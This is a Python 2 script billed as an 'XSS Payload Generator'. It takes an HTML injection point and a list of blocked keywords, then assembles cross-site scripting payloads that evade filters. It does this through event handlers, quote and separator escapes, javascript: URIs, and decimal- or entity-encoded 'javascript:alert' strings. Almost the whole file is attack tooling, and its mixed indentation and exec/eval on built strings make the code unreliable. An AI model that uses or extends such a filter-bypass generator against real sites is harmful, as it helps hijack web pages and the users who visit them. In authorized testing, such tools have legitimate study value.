keywords=[]
seperators=['%20','%0a','%0d','%09','%0c','%0d']
tags=['body','img','input','a','form','iframe','isindex','svg']
body_attributes=['onload','onmouseover','onmouseout','onclick'] #body
img_attributes=['onerror','onclick','onmouseover','onload','onmouseover'] #image
svg_attributes=['onclick','onmouseover','onload','onmouseover'] #svg
input_attributes=['onmouseover','onmouseout','onblur','onclick'] #input
a_attributes=['href','onmouseover','onmouseout','onclick'] #a
form_attributes=['action','onmouseover','onmouseout','onclick'] #form
iframe_attributes=['onload','src','onmouseover','onmouseout','onclick'] #iframe
isindex_attributes=['onmouseover','onmouseout','action','onclick','onblur'] #iframe
functions=['alert','prompt','confirm'] #functions list
allencodeattributes=['src','action','href'] #attributes which requires javascript: protocol
alleventhandlers=['onmouseover','onmouseout','onclick','onblur','onerror'] #all event handlers
payload=""
tag=''
attribute=''
attackattribute=''
failedflag=0

def attributescheck(tag): #check if tag has any attribute to inject
    global failedflag
    
    if(flagcheck()):
        return
    for i in keywords:
        try:
            eval_var=tag+'_attributes.remove(\''+i+'\')'
            exec  eval_var
        except:
            pass
    if len(tags)>0:
        pass
    else:
        failedflag=1
    
        
def tagcheck(): #check if given tag exists in our tags list
    global failedflag
    if(flagcheck()):
        return
    for i in tags:
        if i==tag:
            return
    failedflag=1
    
def tagprocess(point): #return the tag name from input
    point=point[1:point.find(" ")]
    return point.strip(" ")

def attributeprocess(point): #return the attribute name from input
    point=point[point.rfind(" ",0,point.find("$")):point.find("=")]
    return point.strip(" ")

def quotesflag(point): #return quotes set in input
    if(point[point.rfind("=",0,point.find("$"))+1]=='"'):
        return '"'
    elif(point[point.rfind("=",0,point.find("$"))+1]=="'"):
        return "'"
    elif(point[point.rfind("=",0,point.find("$"))+1]=="`"):
        return "`"
    else:
        return "0"
        
def checkfailed(): #check if payload cannot be created 
    global payload
    if(flagcheck()):
        payload="Failed"

    
def seperator(): #return the valid seperator 
    global failedflag
    if(flagcheck()):
        return
    for i in keywords:
        try:
            seperators.remove(i)
        except:
            pass
    if len(seperators)>0:
        return seperators[0]
    else:
        failedflag=1
        return 
                
def quotes(point): #return quotes or seperator
    global failedflag
    if(flagcheck()):
        return ""
    if(quotesflag(point)=="0"):
        return str(seperator())
    else:
        for blockedkeys in keywords:
            if str(quotesflag(point))==blockedkeys:
                failedflag=1
                return ""
                break
	return quotesflag(point)
    

def function_name(): #returns function name which in not listed in blocked list
    global failedflag
    if(flagcheck()):
        return ""
    for i in keywords:
        try:
            functions.remove(i)
        except:
            pass
    if len(functions)>0:
        return functions[0]+"(1)"
    else:
        failedflag=1
        return " "
    
def flagcheck(): #check if failedflag is set
    global failedflag
    if failedflag==1:
        return 1
    else:
        return 0

def stage1():    
    global payload
    tagcheck()
    attributescheck(tag)
    level1()
    level2()
    for attr in allencodeattributes:
		if attackattribute==attr:
			payload=payload+'='
			level6()
			return
		
    level3()

    
def stage2(point): #checks if  we can  use encoded payload
    if point[point.rfind("=",0,point.find("$"))+1]=='$' :
        level5()
	return
    elif point[point.rfind("=",0,point.find("$"))+1]==quotesflag(point):
        if  point[point.rfind("=",0,point.find("$"))+2]=='$':
            level5()
	    return
 
    stage1()

def level1(): #only deals with seperators n quotes to escape
    if(flagcheck()):
        return
    global payload
    payload="null"+quotes(point)
    

def level2(): #deals with event handlers
    global failedflag,payload,tag,attribute,attackattribute
    if(flagcheck()):
        return
    try:
        eval_var=tag+'_attributes.remove(\''+attribute+'\')'
        exec  eval_var
    except:
        pass

    for i in keywords:
        try:
            eval_var=tag+'_attributes.remove(\''+i+'\')'
            exec  eval_var
        except:
            pass
            
    tmp='len('+tag+'_attributes)'       
    length=eval(tmp) 
    tmp1=tag+'_attributes[0]'
    if (length>0):
            attackattribute=eval(tmp1)
            payload=payload+eval(tmp1)
    
    else:
        failedflag=1    
            
    

def level3(): #check if equals to sign is blocked or not
    global failedflag
    if(flagcheck()):
        return
    global payload
    for key in keywords:
        if key=="=":
            failedflag=1    
            return 
    payload=payload+"="+str(function_name())+str(quotes(point))

   



def level5(): #check if given attribute exists in our attribute list for encoding purpose
    global payload
    for attr in allencodeattributes:
        if attr==attribute:
			if attributeintag():
				level6()
				return 
    for attr in alleventhandlers:
    	if attr==attribute:
    		if attributeintag():
			payload=payload+function_name()+'//'
			return
    stage1() 

def attributeintag(): #checks if tag supports attribute
	tmp=tag+'_attributes.index(\''+attribute+'\')'
	try:
		tmp1=eval(tmp)
		return 1
	except:
		pass
    	return 0 

        
def level6(): #check if ":()" are blocked or not and generates payload
	global payload
	for key in keywords:
        	if key==":" or key=="(" or key==")" :
			level7()
			return
	payload=payload+'javascript:'+function_name()+quotes(point)


def level7(): #check if "#&" are blocked or not and generates payload #decimal encoding
	global payload 
	for key in keywords:
        	if key=="&" or key=="#":
			level8()
			return
	payload=payload+'%26%23106%3B%26%23097%26%23118%26%23097%26%23115%26%23099%26%23114%26%23105%26%23112%26%23116%26%23058%26%23097%26%23108%26%23101%26%23114%26%23116%26%23040%26%23039%26%23088%26%23083%26%23083%26%23039%26%23041'+quotes(point)

def level8(): #check if "&;" are blocked or not and generates payload #HTML encoding
	global failedflag,payload 
	for key in keywords:
        	if key=="&" or key==";":
			failedflag=1#stage1()
			return
        payload=payload+'javascript%26colon%3B'+function_name()+'%26lpar%3B0%26rpar%3B'+quotes(point)
	


    		
    

print "#####################################"
print "\n[+]XSS Payload Generator V1.0[+]"
print "[+]Author:- Rakesh Mane[+]"
print "[+]Contact:-rakeshmane12345@gmail.com[+]\n"
print "#####################################"
if 1:
    i=1
    print "Injection point should be in this format:-<input type=text value=$> \nWhere $ represents injected string"
    print "Enter Injection Point:- "
    point=raw_input()
    print "______________________________________"
    tag=tagprocess(point)
    attribute=attributeprocess(point)
    print "Total Number Of Blocked Keywords:- "
    while i==1:
	    try:
		n=int(input())
		i=0
	    except:
		print "Enter a number!!"
    for i in range(0,n):
	print 'Enter Keyword '+str(i+1)+':-'
        keywords.append(raw_input())
    print "______________________________________"
    stage2(point)
    checkfailed()
    print "#####################################"
    print "Injection Point:- "+point
    print "Blocked Keywords:- "+str(keywords[0:n])
    print "Tag:- "+tag
    print "Attribute:- "+attribute
    print "Payload:- "+payload
    print "#####################################"

    
    
